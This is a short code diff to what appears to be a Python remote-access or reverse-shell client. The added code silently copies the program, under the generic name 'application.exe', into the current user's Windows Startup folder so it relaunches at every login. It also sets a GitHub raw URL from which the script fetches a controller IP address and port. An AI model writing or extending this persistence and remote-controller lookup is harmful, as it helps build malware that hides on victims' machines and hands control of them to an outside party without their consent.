@@ -2,9 +2,24 @@ import subprocess
 import time
 import socket
 import requests
+import os
+import shutil
+import getpass
+
+user_name = getpass.getuser()
+
+filename = "application.exe"
+file_path = os.getcwd() + "\\" + filename
+
+startup_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\application.exe' % user_name
+
+if(not os.path.isfile(startup_path)):
+    shutil.copy2(file_path, startup_path)
+
+
 
 def get_ip_and_port():
-    link = "LINK"
+    link = "https://raw.githubusercontent.com/ItsSuhail/ProjectGNIYPS/main/address.md"
     information = requests.get(link).text.strip()
     ip = information.split("<|>")[0]
     port = int(information.split("<|>")[1])
